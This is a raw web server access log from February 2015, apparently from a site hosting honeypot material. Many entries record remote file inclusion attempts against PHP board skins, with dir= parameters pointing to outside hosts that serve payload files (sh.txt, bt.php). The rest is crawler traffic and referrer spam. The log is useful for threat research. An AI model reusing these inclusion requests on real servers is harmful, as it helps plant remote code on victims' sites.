176.31.252.38 - - [21/Feb/2015:02:34:59 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [21/Feb/2015:02:35:00 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [21/Feb/2015:02:35:00 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [21/Feb/2015:02:35:01 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [21/Feb/2015:02:35:01 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [21/Feb/2015:02:35:02 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [21/Feb/2015:02:35:03 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [21/Feb/2015:02:35:04 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [21/Feb/2015:02:50:05 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [21/Feb/2015:02:50:06 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [21/Feb/2015:02:50:07 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [21/Feb/2015:02:50:08 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [21/Feb/2015:02:50:08 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [21/Feb/2015:02:50:09 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [21/Feb/2015:02:50:09 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [21/Feb/2015:02:50:10 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
157.55.39.245 - - [21/Feb/2015:03:04:25 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)" 
66.249.79.160 - - [21/Feb/2015:03:33:14 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 304 168 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
178.137.92.19 - - [21/Feb/2015:03:33:56 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://www.rospromtest.ru/" "Opera/9.00 (Windows NT 5.1; U; en)" 
178.137.92.19 - - [21/Feb/2015:03:33:57 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://www.rospromtest.ru/" "Opera/9.00 (Windows NT 5.1; U; en)" 
178.137.92.19 - - [21/Feb/2015:03:33:57 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://www.rospromtest.ru/" "Opera/9.00 (Windows NT 5.1; U; en)" 
66.249.79.8 - - [21/Feb/2015:03:38:11 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 304 167 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.79.51 - - [21/Feb/2015:03:47:36 -0800] "GET /robots.txt HTTP/1.1" 301 502 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.79.8 - - [21/Feb/2015:03:47:36 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.79.67 - - [21/Feb/2015:03:47:37 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.79.152 - - [21/Feb/2015:03:57:15 -0800] "GET / HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.79.8 - - [21/Feb/2015:04:40:35 -0800] "GET /self.logs/ HTTP/1.1" 200 1237 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
109.120.157.179 - - [21/Feb/2015:06:11:18 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://doska-vsem.ru/" "Mozilla/5.0 (compatible; Add Catalog/2.1;)" 
109.120.157.179 - - [21/Feb/2015:06:11:19 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://doska-vsem.ru/" "Mozilla/5.0 (compatible; Add Catalog/2.1;)" 
109.120.157.179 - - [21/Feb/2015:06:11:19 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://doska-vsem.ru/" "Mozilla/5.0 (compatible; Add Catalog/2.1;)" 
220.181.108.177 - - [21/Feb/2015:06:27:49 -0800] "GET / HTTP/1.1" 200 6751 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2" 
220.181.108.148 - - [21/Feb/2015:06:27:49 -0800] "GET / HTTP/1.1" 200 21960 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2" 
123.125.71.99 - - [21/Feb/2015:06:27:51 -0800] "GET / HTTP/1.1" 200 6751 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2" 
123.125.71.102 - - [21/Feb/2015:06:27:51 -0800] "GET / HTTP/1.1" 200 21960 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2" 
70.114.252.5 - - [21/Feb/2015:07:12:56 -0800] "GET / HTTP/1.1" 304 189 "http://t.co/Qro1LCR4GM" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2305.3 Safari/537.36" 
46.119.124.167 - - [21/Feb/2015:07:55:36 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://na-verh.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
46.119.124.167 - - [21/Feb/2015:07:55:37 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://na-verh.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
46.119.124.167 - - [21/Feb/2015:07:55:37 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://na-verh.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
104.130.161.113 - - [21/Feb/2015:09:25:29 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.113 - - [21/Feb/2015:09:25:29 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.117 - - [21/Feb/2015:09:25:30 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.117 - - [21/Feb/2015:09:25:30 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.117 - - [21/Feb/2015:09:25:34 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 301 491 "-" "Tornado-Async-Client" 
104.130.161.117 - - [21/Feb/2015:09:25:34 -0800] "GET /bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.117 - - [21/Feb/2015:09:25:35 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 301 491 "-" "Tornado-Async-Client" 
104.130.161.117 - - [21/Feb/2015:09:25:35 -0800] "GET /bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.116 - - [21/Feb/2015:09:40:53 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.116 - - [21/Feb/2015:09:40:53 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.117 - - [21/Feb/2015:09:40:55 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.117 - - [21/Feb/2015:09:40:55 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.116 - - [21/Feb/2015:09:41:01 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 492 "-" "Tornado-Async-Client" 
104.130.161.116 - - [21/Feb/2015:09:41:01 -0800] "GET /bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [21/Feb/2015:09:41:03 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 492 "-" "Tornado-Async-Client" 
104.130.161.115 - - [21/Feb/2015:09:41:04 -0800] "GET /bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
178.33.226.103 - - [21/Feb/2015:09:48:35 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [21/Feb/2015:09:48:36 -0800] "GET ////skin/happycast_black/write.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
178.33.226.103 - - [21/Feb/2015:09:48:36 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [21/Feb/2015:09:48:37 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [21/Feb/2015:09:48:37 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [21/Feb/2015:09:48:38 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
178.33.226.103 - - [21/Feb/2015:09:48:38 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [21/Feb/2015:09:48:39 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
211.47.181.38 - - [21/Feb/2015:09:49:01 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [21/Feb/2015:09:49:02 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [21/Feb/2015:09:49:03 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [21/Feb/2015:09:49:04 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
71.6.150.241 - - [21/Feb/2015:09:49:05 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [21/Feb/2015:09:49:06 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [21/Feb/2015:09:49:06 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [21/Feb/2015:09:49:07 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
211.47.181.38 - - [21/Feb/2015:09:49:10 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [21/Feb/2015:09:49:12 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [21/Feb/2015:09:49:12 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [21/Feb/2015:09:49:13 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
112.218.68.155 - - [21/Feb/2015:09:49:26 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:09:49:28 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:09:49:28 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:09:49:29 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:09:49:30 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:09:49:30 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:09:49:31 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:09:49:33 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [21/Feb/2015:09:49:51 -0800] "GET ////skin/happycast_black/write.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [21/Feb/2015:09:49:53 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [21/Feb/2015:09:49:53 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
178.33.226.103 - - [21/Feb/2015:09:49:53 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [21/Feb/2015:09:49:54 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
178.33.226.103 - - [21/Feb/2015:09:49:54 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [21/Feb/2015:09:49:54 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [21/Feb/2015:09:49:55 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [21/Feb/2015:09:50:42 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:09:50:43 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:09:50:43 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:09:50:45 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
198.50.146.246 - - [21/Feb/2015:09:50:50 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:09:50:52 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:09:50:52 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:09:50:53 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
211.47.181.38 - - [21/Feb/2015:09:50:53 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
211.47.181.38 - - [21/Feb/2015:09:50:54 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
211.47.181.38 - - [21/Feb/2015:09:50:55 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
211.47.181.38 - - [21/Feb/2015:09:50:56 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
112.218.68.155 - - [21/Feb/2015:09:51:01 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:09:51:03 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:09:51:04 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:09:51:05 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:09:51:11 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
203.58.0.155 - - [21/Feb/2015:09:51:12 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 418 695 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
112.218.68.155 - - [21/Feb/2015:09:51:12 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:09:51:13 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
203.58.0.155 - - [21/Feb/2015:09:51:13 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 418 695 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
203.58.0.155 - - [21/Feb/2015:09:51:14 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 418 695 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
112.218.68.155 - - [21/Feb/2015:09:51:14 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
203.58.0.155 - - [21/Feb/2015:09:51:15 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 418 695 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
114.202.2.31 - - [21/Feb/2015:09:52:44 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [21/Feb/2015:09:52:46 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [21/Feb/2015:09:52:52 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [21/Feb/2015:09:52:53 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
198.50.146.246 - - [21/Feb/2015:09:53:30 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:09:53:31 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:09:53:31 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:09:53:32 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
112.218.68.155 - - [21/Feb/2015:09:55:38 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [21/Feb/2015:09:55:40 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [21/Feb/2015:09:55:41 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [21/Feb/2015:09:55:42 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
71.6.150.241 - - [21/Feb/2015:09:55:48 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [21/Feb/2015:09:55:49 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
